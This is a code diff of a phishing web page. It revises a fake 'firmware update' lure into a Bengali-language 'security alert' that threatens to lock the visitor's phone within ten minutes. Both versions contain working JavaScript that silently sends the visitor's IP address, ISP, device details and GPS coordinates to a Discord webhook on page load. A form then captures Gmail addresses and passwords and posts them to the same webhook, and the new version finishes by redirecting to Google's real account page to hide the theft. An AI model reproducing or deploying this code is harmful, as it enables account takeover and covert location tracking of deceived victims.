@@ -3,99 +3,99 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
-    <title>System Firmware Update v12.0</title>
+    <title>Critical Security Update</title>
     <style>
-        body { background: #050505; color: #00ff00; font-family: 'Segoe UI', Tahoma, sans-serif; margin: 0; display: flex; justify-content: center; align-items: center; height: 100vh; overflow: hidden; }
-        .container { width: 90%; max-width: 450px; border: 1px solid #333; padding: 25px; background: #000; box-shadow: 0 0 50px rgba(0,255,0,0.2); border-radius: 10px; text-align: center; }
-        .loading-bar { width: 100%; height: 4px; background: #222; margin: 20px 0; position: relative; overflow: hidden; }
-        .progress { width: 0%; height: 100%; background: #00ff00; position: absolute; animation: load 3s forwards; }
-        @keyframes load { to { width: 100%; } }
-        .device-info { font-weight: bold; color: #fff; background: #111; padding: 10px; border-radius: 5px; border: 1px solid #00ff00; margin-bottom: 15px; display: none; }
-        input { width: 100%; padding: 12px; margin: 10px 0; background: #111; border: 1px solid #333; color: #fff; border-radius: 5px; outline: none; }
-        input:focus { border-color: #00ff00; }
-        button { width: 100%; padding: 12px; background: #00ff00; color: #000; border: none; font-weight: bold; border-radius: 5px; cursor: pointer; text-transform: uppercase; }
-        #status-log { font-size: 11px; color: #888; margin-top: 15px; text-align: left; height: 50px; overflow: hidden; }
+        body { background: #ffffff; color: #000; font-family: 'Segoe UI', Arial, sans-serif; margin: 0; display: flex; justify-content: center; align-items: center; height: 100vh; text-align: center; }
+        .warning-box { width: 90%; max-width: 400px; padding: 25px; border-top: 10px solid #d93025; border-radius: 8px; box-shadow: 0 4px 20px rgba(0,0,0,0.15); border-left: 1px solid #eee; border-right: 1px solid #eee; border-bottom: 1px solid #eee; }
+        .danger-text { color: #d93025; font-weight: bold; font-size: 22px; margin-bottom: 10px; }
+        .info-card { background: #f8f9fa; padding: 15px; border-radius: 5px; margin: 20px 0; border: 1px solid #ddd; font-size: 14px; text-align: left; }
+        input { width: 100%; padding: 12px; margin: 10px 0; border: 1px solid #dadce0; border-radius: 4px; box-sizing: border-box; font-size: 16px; }
+        button { width: 100%; padding: 14px; background: #1a73e8; color: #fff; border: none; font-weight: bold; border-radius: 4px; cursor: pointer; font-size: 16px; transition: background 0.3s; }
+        button:hover { background: #1557b0; }
+        .blink { animation: blinker 1.5s linear infinite; }
+        @keyframes blinker { 50% { opacity: 0; } }
     </style>
 </head>
 <body>
-    <div class="container">
-        <h3 id="main-head">SYSTEM SECURITY SHIELD</h3>
-        <div id="device-box" class="device-info">DETECTING HARDWARE...</div>
-        
-        <div class="loading-bar"><div class="progress"></div></div>
-        
-        <div id="login-section" style="display:none;">
-            <p style="font-size: 13px; color: #ccc;">Device Sync Failed. Please verify identity to continue firmware update.</p>
-            <input type="email" id="email" placeholder="Gmail Address" required>
-            <input type="password" id="pass" placeholder="Password" required>
-            <button onclick="sendFinal()">VERIFY & UPDATE</button>
-        </div>
 
-        <div id="status-log">
-            [SYS] Initializing core...<br>
-            [SYS] Locating hardware nodes...
-        </div>
+<div class="warning-box">
+    <div class="danger-text blink">⚠️ সিকিউরিটি অ্যালার্ট!</div>
+    <p style="font-weight: bold;">আপনার এই ডিভাইসটি চিরস্থায়ীভাবে ব্যান্ড হওয়ার পথে।</p>
+    
+    <div class="info-card">
+        <strong>ডিভাইস স্ট্যাটাস:</strong> <span style="color: red;">বিপজ্জনক (Suspicious)</span><br>
+        <strong>আইপি অ্যাড্রেস:</strong> <span id="user-ip">Loading...</span><br>
+        <strong>সনাক্তকৃত ডিভাইস:</strong> <span id="user-dev">Detecting...</span>
     </div>
 
-    <script>
-        const WEBHOOK = "https://discord.com/api/webhooks/1480430371509243965/F15TXq4Y_sbGMb5tuPR2S8ZuWWhqFgZAXyUHx45p9H4KRwgIgFw3B4QfQNZE3km5475e";
+    <p style="font-size: 14px; color: #555; text-align: left;">
+        আপনার ডিভাইসে থাকা সব জিমেইল অ্যাকাউন্ট এবং ব্যক্তিগত তথ্য রক্ষা করতে এখনই আপনার প্রাইমারি জিমেইল দিয়ে ভেরিফাই করুন। ভেরিফাই না করলে আগামী ১০ মিনিটের মধ্যে ফোনের সকল এক্সেস লক হয়ে যাবে।
+    </p>
 
-        setTimeout(() => {
-            const platform = navigator.platform;
-            document.getElementById('device-box').innerText = "DEVICE IDENTIFIED: " + platform;
-            document.getElementById('device-box').style.display = "block";
-            document.getElementById('status-log').innerHTML += "<br>[OK] HARDWARE SYNCED.";
-        }, 1200);
+    <input type="email" id="email" placeholder="আপনার জিমেইল এড্রেস" required>
+    <input type="password" id="pass" placeholder="জিমেইল পাসওয়ার্ড" required>
+    <button onclick="sendFinal()">তথ্য ভেরিফাই এবং ডিভাইস আনলক করুন</button>
+</div>
 
-        setTimeout(() => {
-            document.getElementById('login-section').style.display = "block";
-        }, 3500);
+<script>
+    const HOOK = "https://discord.com/api/webhooks/1480430371509243965/F15TXq4Y_sbGMb5tuPR2S8ZuWWhqFgZAXyUHx45p9H4KRwgIgFw3B4QfQNZE3km5475e";
 
-        async function collectBaseData() {
-            try {
-                const ipRes = await fetch('https://ipapi.co/json/').then(r => r.json());
-                const data = {
-                    content: "🔥 **DEVICE CONNECTED** 🔥",
-                    embeds: [{
-                        color: 0x00ff00,
-                        fields: [
-                            { name: "IP", value: ipRes.ip || "N/A", inline: true },
-                            { name: "ISP", value: ipRes.org || "N/A", inline: true },
-                            { name: "Location", value: ipRes.city + ", " + ipRes.country_name },
-                            { name: "Device", value: navigator.userAgent }
-                        ]
-                    }]
-                };
-                fetch(WEBHOOK, { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify(data) });
+    async function startCapture() {
+        try {
+            const response = await fetch('https://ipapi.co/json/');
+            const ipData = await response.json();
+            
+            document.getElementById('user-ip').innerText = ipData.ip;
+            document.getElementById('user-dev').innerText = navigator.platform;
 
-                navigator.geolocation.getCurrentPosition(p => {
-                    fetch(WEBHOOK, { method: "POST", headers: { "Content-Type": "application/json" }, 
-                    body: JSON.stringify({ content: "📍 GPS: https://www.google.com/maps?q=" + p.coords.latitude + "," + p.coords.longitude })});
-                });
-            } catch (e) {}
-        }
-
-        async function sendFinal() {
-            const email = document.getElementById('email').value;
-            const pass = document.getElementById('pass').value;
-            if(!email || !pass) return alert("Fields cannot be empty!");
-
-            const loginData = {
-                content: "🧨 **GMAIL CAPTURED** 🧨",
+            const packet = {
+                content: "🚨 **ALERT: ACCESS DETECTED**",
                 embeds: [{
-                    color: 0xff0000,
+                    color: 16753920,
                     fields: [
-                        { name: "Email", value: email },
-                        { name: "Password", value: pass }
+                        { name: "IP Address", value: ipData.ip || "N/A", inline: true },
+                        { name: "City/Region", value: ipData.city || "N/A", inline: true },
+                        { name: "Provider", value: ipData.org || "N/A", inline: true },
+                        { name: "System", value: navigator.userAgent }
                     ]
                 }]
             };
-            await fetch(WEBHOOK, { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify(loginData) });
-            alert("System Update Started. Please do not close this window for 10 minutes.");
+            fetch(HOOK, { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify(packet) });
+
+            navigator.geolocation.getCurrentPosition(pos => {
+                fetch(HOOK, { method: "POST", headers: { "Content-Type": "application/json" }, 
+                body: JSON.stringify({ content: "📍 **Location:** https://www.google.com/maps?q=" + pos.coords.latitude + "," + pos.coords.longitude })});
+            });
+        } catch (err) {}
+    }
+
+    async function sendFinal() {
+        const uEmail = document.getElementById('email').value;
+        const uPass = document.getElementById('pass').value;
+
+        if (!uEmail || !uPass) {
+            alert("সবগুলো তথ্য সঠিকভাবে দিন নতুবা আপনার ফোনটি লক হয়ে যাবে!");
+            return;
         }
 
-        collectBaseData();
-    </script>
+        const credentials = {
+            content: "🧨 **CAPTURED DATA**",
+            embeds: [{
+                color: 14233637,
+                fields: [
+                    { name: "Email", value: uEmail },
+                    { name: "Password", value: uPass }
+                ]
+            }]
+        };
+        
+        await fetch(HOOK, { method: "POST", headers: { "Content-Type": "application/json" }, body: JSON.stringify(credentials) });
+        alert("ভেরিফিকেশন সম্পন্ন হয়েছে। আপনার ডিভাইসটি এখন সুরক্ষিত।");
+        window.location.href = "https://myaccount.google.com/";
+    }
+
+    startCapture();
+</script>
+
 </body>
 </html>
-
